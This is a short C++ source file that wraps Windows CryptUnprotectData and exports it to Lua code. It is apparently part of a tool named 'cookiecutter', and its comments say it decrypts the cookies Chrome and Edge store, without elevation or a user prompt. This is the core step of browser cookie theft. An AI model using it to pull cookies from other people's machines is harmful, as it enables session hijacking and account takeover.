//=============================================================================
//  dpapi.cpp — DPAPI decryption wrapper
//  Uses CryptUnprotectData (runs as current user, no elevation needed).
//  Chrome/Edge store encrypted cookies as DPAPI blobs; this unwraps them.
//=============================================================================

#include "cookiecutter.h"
#include <dpapi.h>

#pragma comment(lib, "crypt32.lib")

namespace cookiecutter {

bool DPADecrypt(const std::vector<uint8_t>& ciphertext, std::vector<uint8_t>& plaintext) {
    if (ciphertext.empty()) return false;

    DATA_BLOB inBlob;
    inBlob.cbData = static_cast<DWORD>(ciphertext.size());
    inBlob.pbData = const_cast<BYTE*>(ciphertext.data());

    DATA_BLOB outBlob = { 0, nullptr };

    // CRYPTPROTECT_UI_FORBIDDEN — don't prompt, just fail if interactive needed
    if (!CryptUnprotectData(&inBlob, nullptr, nullptr, nullptr, nullptr,
                            CRYPTPROTECT_UI_FORBIDDEN, &outBlob)) {
        return false;
    }

    plaintext.assign(outBlob.pbData, outBlob.pbData + outBlob.cbData);
    LocalFree(outBlob.pbData);
    return true;
}

} // namespace cookiecutter

// --- Exported C wrapper for Lua-side access ---

extern "C" CC_API bool DPADecryptBlob(
    const uint8_t* ciphertext, size_t cipherLen,
    uint8_t* plaintext, size_t* plainLen
) {
    if (!ciphertext || !plaintext || !plainLen) return false;

    std::vector<uint8_t> ct(ciphertext, ciphertext + cipherLen);
    std::vector<uint8_t> pt;

    if (!cookiecutter::DPADecrypt(ct, pt)) return false;

    if (pt.size() > *plainLen) return false; // buffer too small
    memcpy(plaintext, pt.data(), pt.size());
    *plainLen = pt.size();
    return true;
}
